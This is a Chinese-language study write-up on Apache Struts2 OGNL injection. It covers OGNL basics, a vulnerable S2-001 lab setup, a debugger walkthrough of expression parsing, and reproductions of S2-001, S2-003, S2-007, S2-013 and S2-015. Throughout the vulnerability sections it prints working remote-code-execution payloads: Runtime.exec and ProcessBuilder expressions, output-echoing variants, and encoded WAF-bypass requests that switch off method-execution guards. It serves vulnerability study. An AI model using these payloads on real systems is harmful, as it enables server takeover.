

<a name="E1bZ7"></a>
# 推荐开盖即饮的环境
[https://github.com/kingkaki/Struts2-Vulenv](https://github.com/kingkaki/Struts2-Vulenv)

<a name="MEIAN"></a>
# OGNL
<a name="uBmE1"></a>
## 三大要素：
Expression表达式<br />root根对象、即操作对象<br />context上下文，用于保存对象运行的属性及值，有点类似运行环境的意思，保存了环境变量

小demo
```java
package org.example;

public class User {
    public String name;
    public String age;

    public String getName() {
        return name;
    }

    public void setName(String name) {
        this.name = name;
    }

    public String getAge() {
        return age;
    }

    public void setAge(String age) {
        this.age = age;
    }

    public User() {
    }

    public User(String name, String age) {
        this.name = name;
        this.age = age;
    }
}

```
```java
package org.example;

public class Tester {
    public User user;

    public User getUser() {
        return user;
    }

    public void setUser(User user) {
        this.user = user;
    }
}

```
```java
package org.example;

import ognl.Ognl;
import ognl.OgnlContext;
import ognl.OgnlException;

public class OGNL {
    public static void main(String[] args) throws OgnlException {
        Tester tester = new Tester();
        User Enterpr1se = new User("Enterpr1se", "114514");
        tester.setUser(Enterpr1se);
        //创建contex、设置root
        OgnlContext context=new OgnlContext();
        context.setRoot(tester);
        //设置表达式
        String expression="user.name";
        //解析表达式
        Object ognl= Ognl.parseExpression(expression);
        //调用获取值
        Object value = Ognl.getValue(ognl, context, context.getRoot());
        System.out.println(value);
    }
}

```

打印org.example.Tester.user.name的值。<br />有个设置根对象的操作，然后解析路径。

其中.操作符，用于调用属性或方法，让上一个字符串作为上下文。
```java
String expression="(#a=new java.lang.String(\"calc\")).(@java.lang.Runtime@getRuntime().exec(#a))";
```
这时候就会弹计算器，<br />或者
```java
String expression="(#a=new java.lang.String(\"calc\")),(@java.lang.Runtime@getRuntime().exec(#a))";
```
@操作符：用于调用静态属性、静态方法、静态变量，如上述的@java.lang.Runtime@getRuntime().exec。<br />#操作符用于调用非root对象<br />用于创建map，或用定义变量。<br />$操作符：一般用于配置文件，${name}<br />%操作符：计算其中的OGNL表达式，%{hacker.name}<br />List：直接使用{“green”, “red”, “blue”}创建<br />对象创建：new java.lang.String[]{“foobar”}。

<a name="QKip7"></a>
## 版本限制
3.1.12的黑名单
```java
public static Object invokeMethod(Object target, Method method, Object[] argsArray)
    throws InvocationTargetException, IllegalAccessException
{

    if (_useStricterInvocation) {
        final Class methodDeclaringClass = method.getDeclaringClass();  // Note: synchronized(method) call below will already NPE, so no null check.
        if ( (AO_SETACCESSIBLE_REF != null && AO_SETACCESSIBLE_REF.equals(method)) ||
            (AO_SETACCESSIBLE_ARR_REF != null && AO_SETACCESSIBLE_ARR_REF.equals(method)) ||
            (SYS_EXIT_REF != null && SYS_EXIT_REF.equals(method)) ||
            (SYS_CONSOLE_REF != null && SYS_CONSOLE_REF.equals(method)) ||
            AccessibleObjectHandler.class.isAssignableFrom(methodDeclaringClass) ||
            ClassResolver.class.isAssignableFrom(methodDeclaringClass) ||
            MethodAccessor.class.isAssignableFrom(methodDeclaringClass) ||
            MemberAccess.class.isAssignableFrom(methodDeclaringClass) ||
            OgnlContext.class.isAssignableFrom(methodDeclaringClass) ||
            Runtime.class.isAssignableFrom(methodDeclaringClass) ||
            ClassLoader.class.isAssignableFrom(methodDeclaringClass) ||
            ProcessBuilder.class.isAssignableFrom(methodDeclaringClass) ||
            AccessibleObjectHandlerJDK9Plus.unsafeOrDescendant(methodDeclaringClass) ) {
            throw new IllegalAccessException("........");
        }
```
<a name="b19cE"></a>
## 流程
getvalue下断。<br />![微信截图_20230805171257.png](https://cdn.nlark.com/yuque/0/2023/png/34502958/1691226786220-204674e5-c366-4504-9b64-770648c9cd5e.png#averageHue=%232c2c2b&clientId=udb598b9c-1cb3-4&from=paste&height=148&id=ucc6a54b3&originHeight=185&originWidth=1176&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=25168&status=done&style=none&taskId=uc1048973-5372-4e3e-9d11-ae6744e8c05&title=&width=940.8)<br />![微信截图_20230805171440.png](https://cdn.nlark.com/yuque/0/2023/png/34502958/1691226885739-a74673fd-6902-4d39-9083-55b0a236d249.png#averageHue=%232d2c2c&clientId=udb598b9c-1cb3-4&from=paste&height=289&id=u2527e107&originHeight=361&originWidth=1124&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=45344&status=done&style=none&taskId=u9e79435f-f8a5-41dd-a10c-1b4cabcf1e7&title=&width=899.2)<br />这里的tree是ASTSequence，一般来说有[ASTChain](https://commons.apache.org/proper/commons-ognl/apidocs/org/apache/commons/ognl/ASTChain.html)、[ASTConst](https://commons.apache.org/proper/commons-ognl/apidocs/org/apache/commons/ognl/ASTConst.html)、[ASTCtor](https://commons.apache.org/proper/commons-ognl/apidocs/org/apache/commons/ognl/ASTCtor.html)、[ASTInstanceof](https://commons.apache.org/proper/commons-ognl/apidocs/org/apache/commons/ognl/ASTInstanceof.html)、[ASTList](https://commons.apache.org/proper/commons-ognl/apidocs/org/apache/commons/ognl/ASTList.html)、[ASTMethod](https://commons.apache.org/proper/commons-ognl/apidocs/org/apache/commons/ognl/ASTMethod.html)、[ASTStaticField](https://commons.apache.org/proper/commons-ognl/apidocs/org/apache/commons/ognl/ASTStaticField.html)、[ASTStaticMethod](https://commons.apache.org/proper/commons-ognl/apidocs/org/apache/commons/ognl/ASTStaticMethod.html) 这几种，用于解析和执行语句。<br />![微信截图_20230805171858.png](https://cdn.nlark.com/yuque/0/2023/png/34502958/1691227144035-f63e6e30-88f5-4f65-bed0-cd5afd5fdf57.png#averageHue=%232d2c2a&clientId=udb598b9c-1cb3-4&from=paste&height=151&id=u38f52aeb&originHeight=189&originWidth=731&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=11471&status=done&style=none&taskId=uec69d528-64d6-4523-b451-3350b98bc25&title=&width=584.8)

![微信截图_20230805171945.png](https://cdn.nlark.com/yuque/0/2023/png/34502958/1691227190682-2cb65fad-6c59-471e-8920-363c139afec0.png#averageHue=%232b2b2b&clientId=udb598b9c-1cb3-4&from=paste&height=157&id=uda88118c&originHeight=196&originWidth=934&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=18490&status=done&style=none&taskId=u56ae792d-eb8c-4d78-a985-ec96d34ef19&title=&width=747.2)<br />![微信截图_20230805172022.png](https://cdn.nlark.com/yuque/0/2023/png/34502958/1691227228494-7e86829d-dbef-431c-9b2d-9d370f6d82d0.png#averageHue=%232d2d2c&clientId=udb598b9c-1cb3-4&from=paste&height=159&id=u7134969b&originHeight=199&originWidth=855&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=21566&status=done&style=none&taskId=uac5b4f7c-20b6-4ad3-bf14-76313a9d481&title=&width=684)<br />这里就获取了子节点的值。

获得getruntime，获得exec，然后执行，<br />![微信截图_20230805173012.png](https://cdn.nlark.com/yuque/0/2023/png/34502958/1691227817500-c804a671-8a9a-4e90-b4fe-97c4f46d9d69.png#averageHue=%232f2e2d&clientId=udb598b9c-1cb3-4&from=paste&height=311&id=u4b9e44be&originHeight=389&originWidth=1171&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=72524&status=done&style=none&taskId=u75429636-1298-48f6-a81f-6b32a99497b&title=&width=936.8)


网上现成的漏洞和exp很多，但本着学习的态度，还是复现一下吧。
<a name="avjjt"></a>
# 环境搭建

```java
<dependencies>
<dependency>
<groupId>org.apache.struts</groupId>
<artifactId>struts2-core</artifactId>
<version>2.0.8</version>
</dependency>
</dependencies>
```
添加web框架支持啥的整出个web.xml。<br />web.xml写入
```java
<web-app>
  <display-name>S2-001 Example</display-name>
  <filter>
    <filter-name>struts2</filter-name>
    <filter-class>org.apache.struts2.dispatcher.FilterDispatcher</filter-class>
  </filter>
  <filter-mapping>
    <filter-name>struts2</filter-name>
    <url-pattern>/*</url-pattern>
  </filter-mapping>
  <welcome-file-list>
    <welcome-file>index.jsp</welcome-file>
  </welcome-file-list>
</web-app>
```
写个类
```java
package com.test.s2001.action;

import com.opensymphony.xwork2.ActionSupport;

public class LoginAction extends ActionSupport{
    private String username = null;
    private String password = null;

    public String getUsername() {
        return this.username;
    }

    public String getPassword() {
        return this.password;
    }

    public void setUsername(String username) {
        this.username = username;
    }

    public void setPassword(String password) {
        this.password = password;
    }

    public String execute() throws Exception {
        if ((this.username.isEmpty()) || (this.password.isEmpty())) {
            return "error";
        }
        if ((this.username.equalsIgnoreCase("admin"))
                && (this.password.equals("admin"))) {
            return "success";
        }
        return "error";
    }
}
```
在webapp目录下编辑jsp文件：
```java
<%@ page language="java" contentType="text/html; charset=UTF-8"
         pageEncoding="UTF-8"%>
<%@ taglib prefix="s" uri="/struts-tags" %>

<html>
<head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <title>S2-001</title>
</head>
<body>
<h2>S2-001 Demo</h2>
<s:form action="login">
  <s:textfield name="username" label="username" />
  <s:textfield name="password" label="password" />
  <s:submit></s:submit>
</s:form>
</body>
</html>
```

```java
<%@ page language="java" contentType="text/html; charset=UTF-8"
         pageEncoding="UTF-8"%>
<%@ taglib prefix="s" uri="/struts-tags" %>

<html>
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <title>S2-001</title>
</head>
<body>
<p>Hello <s:property value="username"></s:property></p>
</body>
</html>
```
![微信截图_20230731152754.png](https://cdn.nlark.com/yuque/0/2023/png/34502958/1690788481096-aba31122-cb89-4d0f-a78c-ddfd5f5e18ab.png#averageHue=%233c4044&clientId=ubb712265-4c40-4&from=paste&height=675&id=u5e856b32&originHeight=844&originWidth=1271&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=38321&status=done&style=none&taskId=u38f0b7ae-b4a0-4bea-a672-99dde0ce3f4&title=&width=1016.8)改个输出路径，lib下面导入所有库。<br />为了方便debug可以把tomcat的jar复制到lib下面。<br />resources的下面建立个struts.xml
```java
<?xml version="1.0" encoding="UTF-8"?>

<!DOCTYPE struts PUBLIC
        "-//Apache Software Foundation//DTD Struts Configuration 2.0//EN"
        "http://struts.apache.org/dtds/struts-2.0.dtd">

<struts>
    <package name="S2-001" extends="struts-default">
        <action name="login" class="com.test.s2001.action.LoginAction">
            <result name="success">welcome.jsp</result>
            <result name="error">index.jsp</result>
        </action>
    </package>
</struts>
```
<a name="csBcx"></a>
# S2-001
版本：Struts 2.0.0 - Struts 2.1.8.1
```java
%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{"cmd","-c","clac"})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}
```

```java
%{(new java.lang.ProcessBuilder(new java.lang.String[]{"calc"})).start()}
```
```java
%{(#a=new java.lang.String("calc")).(@java.lang.Runtime@getRuntime().exec(#a))}
```
```java
%{(#a=new java.lang.String("calc")),(@java.lang.Runtime@getRuntime().exec(#a))}
```
从xml说起
```java
<?xml version="1.0" encoding="UTF-8"?>

<!DOCTYPE struts PUBLIC
        "-//Apache Software Foundation//DTD Struts Configuration 2.0//EN"
        "http://struts.apache.org/dtds/struts-2.0.dtd">

<struts>
    <package name="S2-001" extends="struts-default">
        <action name="login" class="com.test.s2001.action.LoginAction">
            <result name="success">welcome.jsp</result>
            <result name="error">index.jsp</result>
        </action>
    </package>
</struts>
```
通过xml配置加入com.opensymphony.xwork2.config.impl.DefaultConfiguration#addPackageConfig，保存到com.opensymphony.xwork2.config.impl.DefaultConfiguration.RuntimeConfigurationImpl#namespaceActionConfigs<br />在web.xml中,指定了org.apache.struts2.dispatcher.FilterDispatcher，被调用时会调用doFilter方法。<br />![微信截图_20230731170537.png](https://cdn.nlark.com/yuque/0/2023/png/34502958/1690794345608-b20f1cc4-a749-4079-bd3e-5e1ef1e4b108.png#averageHue=%232c2b2b&clientId=ubb712265-4c40-4&from=paste&height=279&id=u2a6345dc&originHeight=349&originWidth=1168&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=42811&status=done&style=none&taskId=ue7a2b94c-b3cf-411a-aad6-14c8c7d8253&title=&width=934.4)<br />跟进这里面<br />![微信截图_20230731171312.png](https://cdn.nlark.com/yuque/0/2023/png/34502958/1690794799264-877b1366-5e9f-4ede-a90a-531d765bcb5f.png#averageHue=%232d2d2c&clientId=ubb712265-4c40-4&from=paste&height=305&id=u89d0fe21&originHeight=381&originWidth=1226&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=83704&status=done&style=none&taskId=u6e483a5c-ac0a-4aac-abef-4dbee62054f&title=&width=980.8)<br />这里重新创建了一个proxy，同时创建了一个DefaultActionInvocation的实例。<br />之后会执行proxy.execute().

![微信截图_20230731171448.png](https://cdn.nlark.com/yuque/0/2023/png/34502958/1690794893505-647aa0e4-5133-495a-b03f-b017e31022f2.png#averageHue=%232c2c2b&clientId=ubb712265-4c40-4&from=paste&height=295&id=uffaa3c15&originHeight=369&originWidth=1053&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=38174&status=done&style=none&taskId=ucf07f603-199f-43bb-9319-93adc41f714&title=&width=842.4)<br />触发invoke。<br />![微信截图_20230731171603.png](https://cdn.nlark.com/yuque/0/2023/png/34502958/1690794969687-53fbe617-03a1-4a0c-941d-5bbd0e1efa2b.png#averageHue=%232d2d2c&clientId=ubb712265-4c40-4&from=paste&height=314&id=u2990f688&originHeight=393&originWidth=1085&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=61263&status=done&style=none&taskId=ua9ab4fad-4ba1-434c-b0ba-2fddd7d5760&title=&width=868)<br />迭代遍历interceptors。<br />![](https://github.com/Y4tacker/JavaSec/raw/main/7.Struts2%E4%B8%93%E5%8C%BA/s2-001%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/img/5.png#from=url&id=IwdkY&originalType=binary&ratio=1.25&rotation=0&showTitle=false&status=done&style=none&title=)![5.png](https://cdn.nlark.com/yuque/0/2023/png/34502958/1690795382870-6d6ec9e7-74fe-4083-88bf-3108580f7a9b.png#averageHue=%2384764b&clientId=ubb712265-4c40-4&from=paste&height=654&id=u22f5bc54&originHeight=818&originWidth=2004&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=410756&status=done&style=none&taskId=u5ba376cd-d1d2-4357-ad90-083b003f441&title=&width=1603.2)<br />这里会遍历到一个叫workflow的拦截器。<br />![微信截图_20230802165819.png](https://cdn.nlark.com/yuque/0/2023/png/34502958/1690966706464-e01b039f-a07d-4298-af1e-50b710505d0c.png#averageHue=%239e7e36&clientId=u6c06cca7-5839-4&from=paste&height=75&id=u800a614c&originHeight=94&originWidth=724&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=8620&status=done&style=none&taskId=u979ee850-ccd2-412d-8b23-9c633a39c70&title=&width=579.2)<br />然后里面调用这个方法。<br />resultCode返回error。<br />后面跟进到<br />![微信截图_20230802170635.png](https://cdn.nlark.com/yuque/0/2023/png/34502958/1690967201529-4910114c-130a-4b64-acf5-0eb4a5cb3cf4.png#averageHue=%232d2c2b&clientId=u6c06cca7-5839-4&from=paste&height=274&id=ucdbbb85b&originHeight=343&originWidth=970&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=49565&status=done&style=none&taskId=u950c609a-e55f-4805-8478-6e53a28b8a7&title=&width=776)<br />后面一直跟到
```java
public int doEndTag() throws JspException {
        this.component.end(this.pageContext.getOut(), this.getBody());
        this.component = null;
        return 6;
    }
```

![微信截图_20230802202202.png](https://cdn.nlark.com/yuque/0/2023/png/34502958/1690978940905-cd23dfcd-7868-4942-98bc-f5cc0ac38c32.png#averageHue=%232c2b2b&clientId=ufe1b4028-d641-4&from=paste&height=254&id=u6ad42488&originHeight=318&originWidth=849&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=31232&status=done&style=none&taskId=u149905ef-3ad7-4c6e-98c6-938ccd4f8a4&title=&width=679.2)<br />进去<br />![微信截图_20230802202456.png](https://cdn.nlark.com/yuque/0/2023/png/34502958/1690979106355-1fbe34d0-385a-4079-b8e2-d20107556ca2.png#averageHue=%232d2c2b&clientId=ufe1b4028-d641-4&from=paste&height=285&id=udbff4dbe&originHeight=356&originWidth=856&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=45029&status=done&style=none&taskId=u2c8e9c19-b863-4ef3-95dc-bd4e7ae500f&title=&width=684.8)<br />提取{}里面的内容<br />![微信截图_20230802203050.png](https://cdn.nlark.com/yuque/0/2023/png/34502958/1690979464987-1d428eec-5fda-4057-8471-0a1f36be6f4a.png#averageHue=%232c2b2b&clientId=ufe1b4028-d641-4&from=paste&height=317&id=ufd3117c4&originHeight=396&originWidth=815&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=38004&status=done&style=none&taskId=u229fe0ee-53b8-42b4-9649-49444c64108&title=&width=652)<br />然后进findvalue。<br />![微信截图_20230802204039.png](https://cdn.nlark.com/yuque/0/2023/png/34502958/1690980045611-e505d694-b3bb-44c3-8866-c8725551a84e.png#averageHue=%232c2c2b&clientId=ufe1b4028-d641-4&from=paste&height=249&id=u6a11909a&originHeight=311&originWidth=935&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=36739&status=done&style=none&taskId=ued0ce4ac-07c0-4c12-8b25-218bbf8cd55&title=&width=748)<br />后面会多次调用这个getValue，前面分析过了。


<a name="ikDNx"></a>
# s2-003
打一个ASTEval型，<br />两个括号连接，直接就分析吧。
```java
String expression="('@java.lang.Runtime'+'@getRuntime().exec(\\'calc\\')')('aaa')";
String expression="('@java.lang.Runtime@'+'getRuntime().exec(#aa)')(#aa='calc')"
```
跟一下流程，<br />此时的解析表达式成了ASTEval了，<br />![微信截图_20230805182416.png](https://cdn.nlark.com/yuque/0/2023/png/34502958/1691231062973-8f7f523a-61a0-43cf-9e15-6bf9f8611a51.png#averageHue=%232d2c2c&clientId=udb598b9c-1cb3-4&from=paste&height=273&id=u5fd691e0&originHeight=341&originWidth=1365&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=58082&status=done&style=none&taskId=u6e142454-5e75-4900-824b-55eed2dbfaf&title=&width=1092)<br />主要看一下ASTEval的getValueBody方法，expr获得了第一个()里面的内容。<br />source获得第二个里面的内容。<br />然后解析了expr，并将node转成了ASTChain解析器。<br />后面触发getvalue。

不过setvalue貌似不太行，
```java
String expression="('@java.lang.Runtime@'+'getRuntime().exec(#aa)')(#aa='calc')";
        //解析表达式
        Object ognl= Ognl.parseExpression(expression);
        Ognl.setValue(ognl,(Map) new HashMap<>(),(Object)null);
```
![微信截图_20230805222238.png](https://cdn.nlark.com/yuque/0/2023/png/34502958/1691245365006-ce7e21c5-9661-4c57-8e34-460685467e8a.png#averageHue=%232d2c2b&clientId=udb598b9c-1cb3-4&from=paste&height=218&id=u4d21d484&originHeight=273&originWidth=1195&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=36373&status=done&style=none&taskId=uea47f9ef-ef00-4e79-92b9-1962b7a2f8d&title=&width=956)<br />之前循环的是children.length-1;本地改一下报错，但是还是可以弹计算器的。

主要是由于ASTMethod没有setValue这个方法，![微信截图_20230805222830.png](https://cdn.nlark.com/yuque/0/2023/png/34502958/1691245715943-5fe2e760-3aa1-491d-a3b1-d8e3ec8e041a.png#averageHue=%232b2b2b&clientId=udb598b9c-1cb3-4&from=paste&height=222&id=ucd91861e&originHeight=278&originWidth=1123&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=19286&status=done&style=none&taskId=uaba58308-74b0-4466-b224-05a16f69ea1&title=&width=898.4)<br />调用了node的setValue。<br />但在调用setValue之前，是有调用getvalue的。<br />那就想办法利用这个getValue。<br />之前调用getValue执行的是@java.lang.Runtime@'+'getRuntime().exec(#aa)。<br />![3.png](https://cdn.nlark.com/yuque/0/2023/png/34502958/1691245982419-f18d93cd-dcfe-4672-8afa-c88bf6a87459.png#averageHue=%23544f43&clientId=udb598b9c-1cb3-4&from=paste&height=912&id=ue55f2419&originHeight=1140&originWidth=2800&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=393222&status=done&style=none&taskId=ue30e5ab9-0c3d-45da-8f71-0679790a367&title=&width=2240)<br />这里去触发getvalue就好了，<br />![8.png](https://cdn.nlark.com/yuque/0/2023/png/34502958/1691246590352-d85a9c1f-9ea2-47b2-8834-32992c69178f.png#averageHue=%232b2b2a&clientId=udb598b9c-1cb3-4&from=paste&height=498&id=u38f9b335&originHeight=622&originWidth=1780&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=376664&status=done&style=none&taskId=u89ea273e-fb51-4450-a211-2c5313fce13&title=&width=1424)<br />可以选择如下payload
```java
Ognl.parseExpression("(@java.lang.Runtime@getRuntime().exec('open -a Calculator.app'))('')");
```
```java
 Object o = Ognl.parseExpression("('@java.lang.Runtime@'+'getRuntime().exec(#aa)')(#aa='calc')('Enterpr1se')");
```
<a name="udf20"></a>
## 绕waf
![微信截图_20230805225041.png](https://cdn.nlark.com/yuque/0/2023/png/34502958/1691247046866-620a2ee2-2e94-4ede-a741-9edaa2046941.png#averageHue=%232d2c2b&clientId=udb598b9c-1cb3-4&from=paste&height=218&id=uff309ed1&originHeight=273&originWidth=1101&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=19342&status=done&style=none&taskId=ufb24cd3e-4193-427b-80be-2ce877aefa6&title=&width=880.8)<br />限制了一些字符，<br />可以使用unicode 读到\\u，会再读取四个字符。
```java
('@java.lang.Runtime@'+'getRuntime().exec(\u0023aa)')(\u0023aa\u003d'calc')('')
```

一些更强大的绕法：
```java
http://127.0.0.1:9090/login.action?(%27%5Cu0023context%5B%5C'xwork.MethodAccessor.denyMethodExecution%5C'%5D%5Cu003dfalse')(abc)(def)&('%5Cu0040java.lang.Runtime%40'%2B'getRuntime().exec(%5Cu0023aa)')(%5Cu0023aa%5Cu003d'calc')('Enterpr1se')
```
<a name="nOulL"></a>
# struts-007
限制了age的长度为150以内，且为int。

```java
'+(#application)+'
```
会有回显![QQ截图20230806135801.png](https://cdn.nlark.com/yuque/0/2023/png/34502958/1691301488908-6006cc94-f4b2-4e9d-aa33-3cbf40b1c027.png#averageHue=%23fbfafa&clientId=u42baa2c3-b279-4&from=paste&height=386&id=u49599483&originHeight=483&originWidth=1189&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=27276&status=done&style=none&taskId=ud159062d-cbbb-47d5-bf21-760e5449abc&title=&width=951.2)<br />burp上发送
```java
%27+%2B+%28%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew+java.lang.Boolean%28%22false%22%29+%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%27calc%27%29.getInputStream%28%29%29%29+%2B+%27
```
<a name="vSUE4"></a>
## 分析
com.opensymphony.xwork2.interceptor.ConversionErrorInterceptor
```java
public String intercept(ActionInvocation invocation) throws Exception {

        ActionContext invocationContext = invocation.getInvocationContext();
        Map<String, Object> conversionErrors = invocationContext.getConversionErrors();
        ValueStack stack = invocationContext.getValueStack();

        HashMap<Object, Object> fakie = null;

        for (Map.Entry<String, Object> entry : conversionErrors.entrySet()) {
            String propertyName = entry.getKey();
            Object value = entry.getValue();

            if (shouldAddError(propertyName, value)) {
                String message = XWorkConverter.getConversionErrorMessage(propertyName, stack);

                Object action = invocation.getAction();
                if (action instanceof ValidationAware) {
                    ValidationAware va = (ValidationAware) action;
                    va.addFieldError(propertyName, message);
                }

                if (fakie == null) {
                    fakie = new HashMap<Object, Object>();
                }

                fakie.put(propertyName, getOverrideExpr(invocation, value));
            }
        }

        if (fakie != null) {
            // if there were some errors, put the original (fake) values in place right before the result
            stack.getContext().put(ORIGINAL_PROPERTY_OVERRIDE, fakie);
            invocation.addPreResultListener(new PreResultListener() {
                public void beforeResult(ActionInvocation invocation, String resultCode) {
                    Map<Object, Object> fakie = (Map<Object, Object>) invocation.getInvocationContext().get(ORIGINAL_PROPERTY_OVERRIDE);

                    if (fakie != null) {
                        invocation.getStack().setExprOverrides(fakie);
                    }
                }
            });
        }
        return invocation.invoke();
    }
```
在Object value = entry.getValue();中取出了传入的payload<br /> 在fakie.put(propertyName, getOverrideExpr(invocation, value));中跟进getOverrideExpr。
```java
protected Object getOverrideExpr(ActionInvocation invocation, Object value) {
        return "'" + value + "'";
    }
```
于是前后两端加'，用于闭合。<br />然后放入invocation中，最后通过invoke解析并触发。
<a name="D7nkR"></a>
# S2-013
```java
%24%7B%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23a%3D@java.lang.Runtime@getRuntime%28%29.exec%28%27calc%27%29.getInputStream%28%29%2C%23b%3Dnew%20java.io.InputStreamReader%28%23a%29%2C%23c%3Dnew%20java.io.BufferedReader%28%23b%29%2C%23d%3Dnew%20char%5B50000%5D%2C%23c.read%28%23d%29%2C%23out%3D@org.apache.struts2.ServletActionContext@getResponse%28%29.getWriter%28%29%2C%23out.println%28%2bnew%20java.lang.String%28%23d%29%29%2C%23out.close%28%29%7D
```
该poc为
```java
%{(#_memberAccess['allowStaticMethodAccess']=true)(#context['xwork.MethodAccessor.denyMethodExecution']=false)(#writer=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#writer.println('hacked'),#writer.close())}
```
是%{(exp)}形式，后面这种形式被ban了。<br />不过还有%{exp}格式。不列举了。

<a name="IIWlL"></a>
# S2-015
```java
${new java.lang.ProcessBuilder(new java.lang.String[]{'calc'}).start()}.action
```

